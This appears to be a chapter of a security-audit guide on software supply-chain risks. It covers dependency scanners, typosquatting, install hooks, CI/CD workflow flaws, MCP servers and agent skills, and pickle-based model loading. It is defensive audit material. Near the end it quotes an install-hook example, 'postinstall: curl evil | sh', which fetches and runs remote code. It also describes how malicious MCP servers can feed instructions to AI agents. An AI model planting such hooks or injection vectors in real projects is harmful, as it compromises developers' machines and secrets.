# Supply Chain and Provenance

For anything the project imports rather than wrote — npm/PyPI/crates.io/Go modules packages, git submodules, installed plugins/skills/extensions, vendored source, CI/CD pipelines, build tooling, and model weights for AI targets. Use alongside the classes in [ATTACK-CLASSES.md](ATTACK-CLASSES.md).

Attacker position for this category is mostly `SUPPLY_CHAIN` (MITRE ATT&CK T1195), with sub-techniques:
- **T1195.001** — Compromise Software Dependencies and Development Tools (a package the project consumes).
- **T1195.002** — Compromise Software Supply Chain (the build/release pipeline itself).
- **T1195.003** — Compromise Hardware Supply Chain (out of scope for most software audits, but firmware/RTL targets apply).

## Dependency hygiene (the basics — run these in Phase 1)

| Ecosystem | Audit tooling |
|-----------|---------------|
| npm | `npm audit --omit=dev`, `osv-scanner scan --lockfile package-lock.json`, `pnpm audit --prod` |
| Python | `pip-audit`, `safety check`, `osv-scanner scan --lockfile requirements.txt` |
| Go | `govulncheck ./...` (reachable-CVE only — better than `go list -u`) |
| Rust | `cargo audit`, `cargo deny check` |
| Java | `dependency-check --scan pom.xml`, `osv-scanner` |
| Ruby | `bundle audit check --update` |
| PHP | `composer audit`, `local-php-security-checker` |
| Swift | `swift-audit` (community), manual Package.resolved review |
| Mixed | `osv-scanner` (one tool, many ecosystems), `syft` + `grype` (SBOM + vuln match) |

A scanner CVE is a **lead**, not a finding. Verify:
1. The vulnerable version is actually in the dependency tree (lockfile pinned, transitive, dev-only).
2. The vulnerable code path is actually reachable from the project's code (`govulncheck` does this for Go; for npm/Python, check whether the project calls the affected function).
3. The CVE's impact maps to real impact in *this* project (an RCE in a function the project never calls is a hardening note, not a finding).

## Package substitution / typosquatting

- Dependency names that are near-misses of popular packages (`crossenv` vs `cross-env`, `python3-dateutil` vs `python-dateutil`). Hunt: scan `package.json`, `requirements.txt`, `go.mod`, `Cargo.toml` for names with hyphen/case/letter variations of well-known packages.
- **Install-hooks** (`postinstall` in npm, `setup.py` in Python, build scripts in Cargo): these run at install time with the developer's privileges. A typo-squatted package with a malicious `postinstall` is pre-exploitation RCE on every developer machine that runs `npm install`. Inspect every `postinstall`/`preinstall`/build script.
- **Namespaced package confusion**: a package name that looks internal (`@company/foo`) but is publicly registered because the org scope wasn't claimed.

## Vendored / copied third-party code

- Anything in `vendor/`, `third_party/`, `static/`, `lib/`, checked-in `.jar`/`.dll`/`.so`/`.dylib`.
- Out-of-date copies of libraries with known CVEs — check the vendored version against the upstream advisory DB.
- Modified copies: diff against upstream. A "we patched it locally" claim must be verified — the patch may be incomplete or the wrong fix.
- Vendored source with the LICENSE but no maintainance — these are silent rot. CVE fixed upstream two years ago, the vendored copy still vulnerable.

## Git submodules and direct git deps

- Submodule pinned to a specific commit: check whether that commit is on a public branch (if the upstream repo is hijacked, an attacker can't rewrite your pinned SHA — git SHAs are content-addressed — but they can push a new commit the project pulls in on the next update).
- Direct git deps in `package.json` (`"foo": "git+https://github.com/x/foo.git"`) without a commit hash — pulls `HEAD` on every install. Tag-only or branch-only git deps are mutable.

## CI/CD pipeline (T1195.002)

- **Workflow file auditing** (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`, `azure-pipelines.yml`):
  - `pull_request_target` trigger runs with repo secrets on PR content — any step that checks out the PR head and runs build/test is a privilege-escalation sink. A malicious PR can steal secrets via artifact exfiltration, env-var dump, or runner abuse.
  - Self-hosted runners without ephemeral cleanup — a poisoned job leaves state for the next job (persistent backdoor on the runner).
  - `if: github.actor == 'dependabot[bot]'` checks that gate on an attacker-controllable field.
  - Secrets in env vars that are dumped to logs on error.
  - Workflow that runs on `issue_comment` or `pull_request` with no write permission gating → any commenter can trigger CI with secrets.
- **Build tooling**: Dockerfiles that pull `FROM latest`, build scripts that fetch `curl | sh`, Makefiles that exec arbitrary shell on `make test`. Build-time internet fetches are supply-chain bridges.
- **Release artifacts**: are signatures present? SBOM? Provenance attestation (SLSA)? Missing provenance on published artifacts is a hardening note; a published artifact whose provenance can be forged is a finding.

## Plugins, extensions, MCP servers, skills

These are supply-chain surface with extra dimensions:

- **MCP servers**: the user installs a third-party MCP server. That server sees every prompt, every tool argument, every tool result, and can return content that the model treats as instructions. Audit both the server (see [AI-AND-LLM.md](AI-AND-LLM.md)) and the client trust model.
- **Editor/IDE extensions, Claude/OpenCode/Codex skills, Copilot extensions**: same trust model. A skill can read every file the agent can read. A skill with `bash` access is full RCE.
- **Plugin sandboxing**: is there one? Most agent/skill frameworks have no sandbox. Document in the threat model.

## Model supply chain (AI targets)

- **Model weights from Hugging Face / Hub**: pin by commit SHA, not by tag (tags can be moved). Audit the model card for known issues. Scan with `modelscan` (pickle/PyTorch deserialization RCE).
- **Pickle / PyTorch `.pt` / `.bin` deserialization**: loading an untrusted pickle is arbitrary code execution. Any code path that `pickle.load`s a model file from an untrusted source is RCE-by-design.
- **Fine-tuning data**: a poisoned corpus that triggers a behavior on a specific phrase is a `SUPPLY_CHAIN`-positioned backdoor. Rare to find in audit; document as a threat-modeling note if the fine-tuning pipeline ingests untrusted data.
- **Tokenizer / config injection**: tokenizers and model configs (YAML/JSON) are parsers; see [ATTACK-CLASSES.md](ATTACK-CLASSES.md) injection classes.

## Outputs

Tag findings with:
- T1195 sub-technique (.001 / .002 / .003).
- The exact dependency name + version + the CVE (if applicable).
- The reachability finding (which project code calls the vulnerable function).
- For pipeline findings: the workflow file path + the trigger + the secret exposure path.
- For plugin/MCP/skill findings: cross-reference [AI-AND-LLM.md](AI-AND-LLM.md).

Production viability for supply-chain findings is usually `CONDITIONAL_VIABLE` (the supply chain *could* be compromised) — except for intrinsic issues like "the install hook is `postinstall: curl evil | sh`" which is `VIABLE` regardless of whether anyone has exploited it yet (that's Rule 08 in [VALIDATION-AND-REPORTING.md](VALIDATION-AND-REPORTING.md): intrinsic security flaws).
